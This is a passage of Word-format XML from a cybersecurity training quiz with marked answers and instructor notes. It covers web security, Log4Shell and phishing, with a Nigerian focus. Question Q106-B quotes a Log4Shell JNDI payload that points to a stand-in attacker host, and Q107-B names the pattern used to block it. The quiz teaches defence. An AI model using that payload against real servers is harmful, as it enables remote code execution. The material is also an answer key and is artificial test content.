        <w:t>B) Intercept and log all traffic between browser and server passively</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Manually modify and resend individual HTTP requests to test server responses</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Brute force login pages with a wordlist of passwords</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Concept] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Proxy = intercept. Repeater = manual testing. Intruder = automated fuzzing. Scanner = automated vuln detection. Know which tool does what.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q100</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which HTTP header prevents a browser from rendering a page inside an iframe (clickjacking defence)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Content-Security-Policy</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) X-Content-Type-Options</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>X-Frame-Options: DENY</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Strict-Transport-Security</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Clickjacking = transparent iframe over a trusted page tricks user into clicking something. X-Frame-Options: DENY prevents iframe embedding entirely.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q101</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>OWASP ZAP is used in web security for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Encrypting web traffic between clients and servers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Scanning DNS records for web application assets</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Automated and manual web application vulnerability scanning</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Generating SSL/TLS certificates for web applications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [Recall] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* ZAP = Zed Attack Proxy. Open-source Burp Suite alternative. Great for students starting out. Used in MetaBridge labs.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q102</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A developer finds that changing `?account_id=1001` to `?account_id=1002` in a URL shows a different customer's bank statement. This is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) SQL injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Directory traversal</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Cross-Site Request Forgery (CSRF)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>IDOR — Insecure Direct Object Reference</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* One of the most common bugs in Nigerian fintech. Fix: server-side authorisation check — does THIS user own account_id 1002?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q103</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Cross-Site Request Forgery (CSRF) tricks:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) The database into executing malicious SQL</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) The web server into running attacker-supplied code</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>An authenticated user's browser into submitting unauthorised requests on their behalf</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A search engine into indexing private pages</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CSRF = victim is logged in to bank; attacker's page sends hidden fund transfer request. Defence: CSRF tokens, SameSite cookie attribute.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q104</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What is "security misconfiguration" (OWASP A05)?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Using outdated encryption algorithms in new applications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Storing sensitive data without proper encryption</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Failing to validate user input on form fields</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Improperly configured permissions, settings, or features exposing the application to attack</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Examples: default credentials, verbose error messages exposing stack traces, directory listing enabled, S3 buckets public.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q105</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A security researcher finds that a Nigerian bank's mobile API returns all customer transaction history when queried with `GET /api/transactions?customer_id=ANY_NUMBER` — no authentication token required. Which OWASP category, OWASP API Security risk, and fix applies?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A03 Injection; API1 BFLA; Use parameterised queries</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A07 Auth Failures; API3 Excessive Data Exposure; Implement rate limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A01 Broken Access Control; API1 BOLA (Broken Object Level Authorisation); Enforce server-side ownership check on every request</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A05 Misconfiguration; API2 Broken Authentication; Enable HTTPS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Classic BOLA/IDOR in a Nigerian fintech API. Debrief: This exact vulnerability pattern has appeared in real Nigerian fintech breaches. Fix = server must verify that the requesting user OWNS the resource being accessed, on every single request.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 7 BONUS — Log4Shell Questions (Q105-B through Q107-B)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Use these as extension questions for advanced cohorts or as a dedicated Log4Shell deep-dive segment.*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q105-B</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Log4Shell (CVE-2021-44228) is classified as which OWASP Top 10 category?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) A03: Injection</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) A05: Security Misconfiguration</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A06: Vulnerable and Outdated Components</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) A08: Software and Data Integrity Failures</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Key teaching — Log4Shell is not a code the developers wrote; it is a dependency they included. A06 = you are responsible for ALL code your application runs, including third-party libraries.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q106-B</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The Log4Shell exploit works by inserting a string like `${jndi:ldap://attacker.com/exploit}` into a field that gets logged. What does the vulnerable server do when it processes this string?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Displays the attacker's text verbatim in an error message</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Blocks the request and logs a security warning</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Makes an outbound network request to the attacker's server and executes the returned code</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Crashes the logging service with a denial-of-service</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">*Instructor Note:* JNDI (Java Naming and Directory Interface) lookup — Log4j interprets the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:hAnsi="Courier New"/>
          <w:color w:val="0F772A"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>${jndi:...}</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> syntax as a lookup and executes it. The server phones home to the attacker. This is unauthenticated Remote Code Execution in a logging call. CVSS 10.0 = maximum.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q107-B</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ★ DOUBLE POINTS</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A security team discovers their Java enterprise application is using Log4j 2.14.1. Exploitation attempts matching the Log4Shell pattern are visible in their web logs. They have 2 hours before business opens. In order of priority, what should they do FIRST?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Rebuild the entire application from scratch on a non-Java stack</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Block all inbound internet traffic with a firewall rule until the situation is assessed</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Apply the Log4j patch (upgrade to 2.17.1+) on all affected services immediately, or if patching is impossible, apply WAF rules blocking `${jndi:` patterns as a temporary mitigation</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Submit a NDPA breach notification immediately — the vulnerability means a breach has already occurred</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [SCENARIO] · *Time:* 60 s · *Points:* 2,000 ★</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Debrief carefully — option D is wrong because a vulnerability is not yet a breach (no confirmed data exfiltration). Option B is partial mitigation. Correct answer = patch first (C), then assess for compromise and trigger breach notification only if evidence of data exfiltration exists.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>MODULE 8 [ADVANCED]: Social Engineering &amp; Phishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Level: Advanced | Questions: Q106–Q120*</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q106</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Which Cialdini principle does a phishing email use when it says "Your account will be suspended in 24 hours"?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Reciprocity</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Social Proof</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Liking</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Urgency (Scarcity)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Urgency bypasses rational thinking — forces immediate action without verification. "Act now or lose everything."</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q107</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>A caller claims to be from the CBN and asks for your BVN and ATM PIN to "verify your account." This is:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Phishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Smishing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>C) Baiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">D) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Vishing (voice phishing)</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 20 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* Extremely common in Nigeria — CBN, GTBank, First Bank impersonation calls. The CBN will NEVER ask for your PIN.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q108</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Social engineering is most dangerous because it:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Uses advanced technical exploits that patch-management cannot address</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Can only target IT staff and system administrators</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Exploits human psychology rather than technical vulnerabilities — no patch exists</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Is always detectable by anti-virus software</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* "The human is the weakest link" — Kevin Mitnick. Technical controls can be bypassed by tricking users.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q109</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>What makes "spear phishing" different from regular phishing?</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) Spear phishing uses SMS; regular phishing uses email</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Spear phishing always involves telephone calls</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Spear phishing is personalised, targeting a specific individual using their name, role, and context</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) Spear phishing uses more sophisticated malware in attachments</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [CONCEPT] · *Time:* 45 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Instructor Note:* CEO fraud starts with spear phishing the CEO's email style. OSINT from LinkedIn + company website enables personalisation.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="6" w:space="1" w:color="2563EB"/>
        </w:pBdr>
        <w:spacing w:after="40"/>
      </w:pPr>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Q110</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:r/>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>The SilverTerrier threat group is known for:</w:t>
      </w:r>
      <w:r/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>A) State-sponsored attacks on critical infrastructure in West Africa</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>B) Ransomware attacks targeting Nigerian hospitals</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">C) </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Nigeria-linked Business Email Compromise (BEC) operations targeting global organisations</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> ✓</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>D) SMS phishing (smishing) campaigns against Nigerian bank customers</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>*Type:* [RECALL] · *Time:* 30 s · *Points:* 1,000</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
